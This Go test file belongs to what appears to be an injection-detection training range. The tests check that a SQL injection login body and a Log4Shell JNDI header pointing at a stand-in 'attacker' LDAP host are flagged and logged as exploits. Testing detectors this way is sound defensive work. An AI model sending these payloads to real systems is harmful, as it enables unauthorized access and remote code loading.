package http_test

import (
	"bytes"
	"encoding/json"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/m-mizutani/gt"
	httpctrl "github.com/m-mizutani/semgate-example/pkg/controller/http"
	"github.com/m-mizutani/semgate-example/pkg/usecase"
	"github.com/m-mizutani/semgate-example/pkg/utils/logging"
)

type respEnvelope struct {
	Endpoint  string         `json:"endpoint"`
	Exploited bool           `json:"exploited"`
	Category  string         `json:"category"`
	RuleID    string         `json:"rule_id"`
	Detail    string         `json:"detail"`
	Message   string         `json:"message"`
	Result    map[string]any `json:"result"`
}

func newTestServer(t *testing.T, logBuf io.Writer, opts ...httpctrl.Option) http.Handler {
	t.Helper()
	sim, err := usecase.NewSimulator()
	gt.NoError(t, err)
	t.Cleanup(func() { _ = sim.Close() })

	if logBuf == nil {
		logBuf = io.Discard
	}
	logger := logging.New(logBuf, logging.FormatJSON, slog.LevelInfo)

	staticFS := fstest.MapFS{
		"index.html": &fstest.MapFile{Data: []byte("<!doctype html><title>Injection Range</title>")},
	}
	h, err := httpctrl.New(sim, staticFS, logger, opts...)
	gt.NoError(t, err)
	return h
}

func decodeEnvelope(t *testing.T, body io.Reader) respEnvelope {
	t.Helper()
	var env respEnvelope
	gt.NoError(t, json.NewDecoder(body).Decode(&env))
	return env
}

func TestLoginHandler(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	t.Run("sqli fires", func(t *testing.T) {
		body := `{"username":"admin' OR '1'='1","password":"x"}`
		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusOK)
		env := decodeEnvelope(t, res.Body)
		gt.Bool(t, env.Exploited).True()
		gt.String(t, env.Category).Equal("sqli")
	})

	t.Run("benign login", func(t *testing.T) {
		body := `{"username":"alice","password":"wrong"}`
		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusOK)
		env := decodeEnvelope(t, res.Body)
		gt.Bool(t, env.Exploited).False()
	})

	t.Run("body too large", func(t *testing.T) {
		big := `{"username":"` + strings.Repeat("a", 1100) + `","password":"x"}`
		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(big))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusRequestEntityTooLarge)
	})

	t.Run("invalid json", func(t *testing.T) {
		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader("{not json"))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusBadRequest)
	})

	t.Run("trailing data after json is rejected", func(t *testing.T) {
		// A small valid object followed by junk (still under 1KB) must not be
		// accepted as a valid request.
		body := `{"username":"alice","password":"x"} and then some trailing data`
		res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusBadRequest)
	})
}

func TestQueryHandlers(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	t.Run("query too large", func(t *testing.T) {
		res, err := http.Get(srv.URL + "/api/ping?host=" + strings.Repeat("a", 1100))
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusRequestEntityTooLarge)
	})

	t.Run("missing param", func(t *testing.T) {
		res, err := http.Get(srv.URL + "/api/files")
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusBadRequest)
	})
}

func TestTrackHandler(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	t.Run("jndi in header fires", func(t *testing.T) {
		req, _ := http.NewRequest(http.MethodGet, srv.URL+"/api/track", nil)
		req.Header.Set("X-Log-Tag", "${jndi:ldap://attacker/x}")
		res, err := http.DefaultClient.Do(req)
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusOK)
		env := decodeEnvelope(t, res.Body)
		gt.Bool(t, env.Exploited).True()
		gt.String(t, env.Category).Equal("log4shell")
	})

	t.Run("missing header", func(t *testing.T) {
		res, err := http.Get(srv.URL + "/api/track")
		gt.NoError(t, err)
		defer func() { _ = res.Body.Close() }()
		gt.Number(t, res.StatusCode).Equal(http.StatusBadRequest)
	})
}

func TestSPAFallback(t *testing.T) {
	srv := httptest.NewServer(newTestServer(t, nil))
	t.Cleanup(srv.Close)

	res, err := http.Get(srv.URL + "/hints")
	gt.NoError(t, err)
	defer func() { _ = res.Body.Close() }()
	gt.Number(t, res.StatusCode).Equal(http.StatusOK)
	body, err := io.ReadAll(res.Body)
	gt.NoError(t, err)
	gt.String(t, string(body)).Contains("Injection Range")
}

func TestDetectionLog(t *testing.T) {
	var buf bytes.Buffer
	srv := httptest.NewServer(newTestServer(t, &buf))
	t.Cleanup(srv.Close)

	body := `{"username":"admin' OR '1'='1","password":"x"}`
	res, err := http.Post(srv.URL+"/api/login", "application/json", strings.NewReader(body))
	gt.NoError(t, err)
	_ = res.Body.Close()

	out := buf.String()
	gt.String(t, out).Contains(`"msg":"detection"`)
	gt.String(t, out).Contains(`"exploited":true`)
	gt.String(t, out).Contains(`"category":"sqli"`)
	gt.String(t, out).Contains(`"level":"WARN"`)
	gt.String(t, out).Contains(`"payload_location":"body"`)
}
